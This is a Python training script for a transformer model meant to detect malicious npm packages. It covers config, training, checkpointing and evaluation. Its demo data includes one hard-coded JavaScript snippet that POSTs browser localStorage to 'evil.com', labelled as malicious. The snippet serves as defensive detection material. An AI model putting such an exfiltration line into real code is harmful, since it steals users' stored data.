#!/usr/bin/env python3
"""
NeoBERT Training Pipeline
Train NeoBERT transformer model for malicious package detection.
"""

import argparse
import logging
import os
import pickle
from pathlib import Path
import torch
import sys

# Add project root to path
sys.path.append(str(Path(__file__).parent))

from neobert.config import create_default_config, save_config_to_json, load_config_from_json
from neobert.model import create_neobert_model
from neobert.trainer import NeoBERTTrainer, PackageUnit
from neobert.evaluator import NeoBERTEvaluator

logger = logging.getLogger(__name__)


def setup_logging(log_level: str = "INFO"):
    """Setup logging configuration."""
    
    # Create logs directory
    Path("logs/neobert").mkdir(parents=True, exist_ok=True)
    
    # Configure logging
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(f"logs/neobert/training.log"),
            logging.StreamHandler()
        ]
    )


def create_sample_data():
    """Create sample training data for demonstration."""
    
    logger.info("Creating sample training data...")
    
    # Sample benign package unit
    benign_sample = PackageUnit(
        package_name="sample-utils",
        ecosystem="npm",
        unit_id="function_1",
        content="function isValid(input) { return input != null; }",
        unit_type="function",
        label=0,
        sample_type="benign",
        metadata={}
    )
    
    # Sample malicious package unit
    malicious_sample = PackageUnit(
        package_name="malicious-stealer",
        ecosystem="npm", 
        unit_id="function_1",
        content="function stealData() { fetch('http://evil.com/steal', {method: 'POST', body: localStorage}); }",
        unit_type="function",
        label=1,
        sample_type="malicious_intent",
        metadata={}
    )
    
    # Create minimal dataset
    train_samples = [benign_sample] * 100 + [malicious_sample] * 20
    val_samples = [benign_sample] * 20 + [malicious_sample] * 4
    
    return train_samples, val_samples


def load_training_data(data_path: str = None):
    """Load training data from files or create sample data."""
    
    if data_path and Path(data_path).exists():
        logger.info(f"Loading training data from {data_path}")
        
        with open(f"{data_path}/train_units.pkl", "rb") as f:
            train_samples = pickle.load(f)
        
        with open(f"{data_path}/val_units.pkl", "rb") as f:
            val_samples = pickle.load(f)
            
        logger.info(f"Loaded {len(train_samples)} train, {len(val_samples)} val samples")
        
    else:
        logger.warning("No data path provided, creating sample data for demonstration")
        train_samples, val_samples = create_sample_data()
    
    return train_samples, val_samples


def main():
    """Main training function."""
    
    parser = argparse.ArgumentParser(description="Train NeoBERT model")
    parser.add_argument("--config", type=str, help="Path to config file")
    parser.add_argument("--data-path", type=str, help="Path to training data directory")
    parser.add_argument("--batch-size", type=int, default=8, help="Batch size")
    parser.add_argument("--learning-rate", type=float, default=5e-5, help="Learning rate")
    parser.add_argument("--max-length", type=int, default=512, help="Max sequence length")
    parser.add_argument("--pooling-strategy", type=str, default="attention", 
                       choices=["mean", "attention", "mil"], help="Pooling strategy")
    parser.add_argument("--device", type=str, default="auto", help="Device (auto/cpu/cuda)")
    parser.add_argument("--log-level", type=str, default="INFO", help="Logging level")
    parser.add_argument("--save-dir", type=str, default="checkpoints/neobert", help="Save directory")
    parser.add_argument("--resume", type=str, help="Resume from checkpoint")
    
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_level)
    logger.info("🎯 Starting NeoBERT training...")
    
    # Load or create configuration
    if args.config and Path(args.config).exists():
        logger.info(f"Loading config from {args.config}")
        neobert_config, training_config, eval_config = load_config_from_json(args.config)
    else:
        logger.info("Using default configuration")
        neobert_config, training_config, eval_config = create_default_config()
    
    # Override config with command line args
    if args.batch_size != 8:
        training_config.batch_size = args.batch_size
    if args.learning_rate != 5e-5:
        training_config.learning_rate = args.learning_rate
    if args.max_length != 512:
        neobert_config.max_length = args.max_length
    if args.pooling_strategy != "attention":
        neobert_config.pooling_strategy = args.pooling_strategy
    
    # Setup device
    if args.device == "auto":
        device = "cuda" if torch.cuda.is_available() else "cpu"
    else:
        device = args.device
    
    logger.info(f"Using device: {device}")
    
    # Create save directory
    os.makedirs(args.save_dir, exist_ok=True)
    
    # Save configuration
    config_path = os.path.join(args.save_dir, "config.json")
    save_config_to_json(neobert_config, training_config, eval_config, config_path)
    logger.info(f"Saved config to {config_path}")
    
    # Load training data
    try:
        train_samples, val_samples = load_training_data(args.data_path)
    except Exception as e:
        logger.error(f"Failed to load training data: {e}")
        logger.info("Creating minimal sample data for testing...")
        train_samples, val_samples = create_sample_data()
    
    # Create model
    logger.info("Creating NeoBERT model...")
    model = create_neobert_model(neobert_config, device)
    logger.info(f"Model created with {sum(p.numel() for p in model.parameters()):,} parameters")
    
    # Create trainer
    trainer = NeoBERTTrainer(model, training_config, neobert_config)
    
    # Resume from checkpoint if specified
    if args.resume and Path(args.resume).exists():
        logger.info(f"Resuming from checkpoint: {args.resume}")
        trainer.load_checkpoint(args.resume)
    
    # Start training
    logger.info("Starting NeoBERT training with progressive curriculum...")
    logger.info(f"Training samples: {len(train_samples)}")
    logger.info(f"Validation samples: {len(val_samples)}")
    logger.info(f"Pooling strategy: {neobert_config.pooling_strategy}")
    
    try:
        results = trainer.train(train_samples, val_samples)
        
        # Save results
        results_path = os.path.join(args.save_dir, "training_results.json")
        import json
        with open(results_path, "w") as f:
            json.dump(results, f, indent=2, default=str)
        
        logger.info("✅ NeoBERT training completed successfully!")
        logger.info(f"Results saved to {results_path}")
        logger.info(f"Final model saved to {results.get('best_model_path', 'checkpoints/')}")
        
        # Quick evaluation
        if val_samples:
            logger.info("Running quick evaluation...")
            evaluator = NeoBERTEvaluator(model, eval_config, neobert_config)
            eval_results = evaluator.evaluate_classification(val_samples[:50])  # Quick eval
            
            logger.info(f"Validation AUC: {eval_results.get('roc_auc', 0.0):.3f}")
            logger.info(f"Validation F1: {eval_results.get('f1_score', 0.0):.3f}")
        
    except Exception as e:
        logger.error(f"Training failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    
    logger.info("🎉 NeoBERT training pipeline completed!")


if __name__ == "__main__":
    main()